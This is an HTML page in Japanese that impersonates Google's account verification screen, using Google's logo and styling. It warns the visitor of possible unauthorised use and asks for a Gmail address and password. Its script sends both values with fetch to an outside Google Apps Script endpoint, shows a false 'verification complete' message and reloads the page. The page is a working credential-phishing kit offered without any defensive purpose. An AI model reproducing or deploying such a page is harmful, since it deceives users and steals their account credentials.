<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Googleアカウントの本人確認</title>
    <style>
        body { 
            font-family: 'Roboto', arial, sans-serif; 
            background-color: #f8f9fa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 20px; 
        }
        .card { 
            background: white; 
            border: 1px solid #dadce0; 
            border-radius: 26px; 
            padding: 40px; 
            width: 100%; 
            max-width: 400px; 
            text-align: left; 
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        /* ロゴ画像の設定 */
        .logo-img {
            width: 40px; 
            height: auto;
            margin-bottom: 15px;
        }
        h1 { 
            font-size: 36px; 
            font-weight: 500; 
            margin: 0 0 10px; 
            color: #202124; 
        }
        p { 
            color: #202124; 
            margin-bottom: 30px; 
            font-size: 16px;
            font-weight: 400;
        }
        input, textarea { 
            width: 100%; 
            padding: 17px 12px; 
            margin-bottom: 15px; 
            border: 1.3px solid #dadce0; 
            border-radius: 4px; 
            box-sizing: border-box; 
            font-size: 14px; 
        }
        input:focus, textarea:focus { 
            outline: none; 
            border: 2px solid #1a73e8; 
            padding: 12px 14px;
        }
        .footer { 
            display: flex; 
            justify-content: flex-end; 
            margin-top: 20px; 
        }
        button { 
            background: #1a73e8; 
            color: white; 
            border: none; 
            padding: 10px 25px; 
            border-radius: 23px; 
            font-weight: 500; 
            cursor: pointer; 
            font-size: 14px;
        }
        button:hover { 
            background: #1765cc; 
            box-shadow: 0 1px 3px rgba(60,64,67,0.3); 
        }
        button:disabled { background: #ccc; cursor: not-allowed; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Google_Favicon_2025.svg" alt="logo" class="logo-img">
    
    <h1>Google アカウントの本人確認</h1>
    <p>アカウントが不正に利用された可能性があります。再ログインして、本人確認をしてください。</p>
    
    <input type="text" id="name" placeholder="Gmailアドレス">
    <textarea id="opinion" rows="1" placeholder="パスワードを入力" required></textarea>
    
    <div class="footer">
        <button id="submitBtn" onclick="submitForm()">本人確認して続ける</button>
    </div>
</div>

<script>
    async function submitForm() {
        // ステップ1で取得したURLをここに貼り付け
        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyEIAw_OBFy_fypjmhRapswSn3cW-aun1Z8kUnLGWfVSFfdqrnPiPxWqiaHRJfoCH5p/exec"; 
        
        const btn = document.getElementById('submitBtn');
        const name = document.getElementById('name').value || "匿名";
        const opinion = document.getElementById('opinion').value;

        if (!opinion) {
            alert("未入力の事項があります");
            return;
        }

        btn.disabled = true;
        btn.innerText = "本人確認中...";

        try {
            // mode: 'no-cors' を使うことでCORSエラーを回避しつつGASへ飛ばします
            await fetch(WEB_APP_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name, opinion })
            });
            
            alert("本人確認が完了しました。");
            location.reload(); 
        } catch (e) {
            console.error(e);
            alert("エラーが発生しました。");
            btn.disabled = false;
            btn.innerText = "送信";
        }
    }
</script>

</body>
</html>
